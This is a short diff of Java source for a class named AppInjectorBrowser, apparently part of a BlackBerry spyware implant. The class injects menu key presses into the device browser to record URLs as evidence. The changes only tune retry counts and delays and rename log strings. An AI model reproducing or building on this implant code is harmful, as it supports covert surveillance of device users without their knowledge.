@@ -30,10 +30,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
     private static final int DELAY = 5000;
-    private static final int MAX_TRIES = 6;
+    private static final int MAX_TRIES = 8;
 
     private int tries =0;
-    private int delay = 100;
+    private int delay = 200;
     boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
@@ -76,11 +76,14 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
             debug.error("callMenuByKey: too many tries");
             //#endif
             if(tries == MAX_TRIES){
-                Evidence.info("NO BBM");
+                Evidence.info("NO URL");
             }
             return false;
         }
 
+        //#ifdef DEBUG
+        debug.trace("callMenuByKey press raw key: " + tries);
+        //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
@@ -105,7 +108,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     public void setInfected(boolean value) {
         if(value){
-            Evidence.info("Browser");
+            Evidence.info("URL");
         }
         infected = true;
     }
